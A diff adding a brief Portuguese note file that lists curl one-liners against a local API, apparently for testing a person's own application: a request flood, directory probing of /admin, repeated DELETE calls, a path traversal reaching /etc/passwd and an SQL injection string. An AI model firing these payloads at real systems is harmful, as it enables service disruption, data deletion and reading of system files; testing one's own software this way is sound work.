@@ -1,0 +1,9 @@
+DoS -> for i in {1..60}; do curl -s -o /dev/null http://localhost/api/produtos & done; wait
+
+Fuzzing de Diretorios -> for i in {1..20}; do curl -s -o /dev/null http://localhost/admin & done; wait
+
+Mapeamento de API -> for i in {1..10}; do curl -X DELETE -s -o /dev/null http://localhost/api/produtos; done (nao foi)
+
+Path transversal (buscar arquivos linux)-> curl -s -o /dev/null "http://localhost/api/produtos/../../../etc/passwd"
+
+sqlinjection -> curl -s -o /dev/null "http://localhost/api/produtos?pesquisa=' OR 1=1 --"
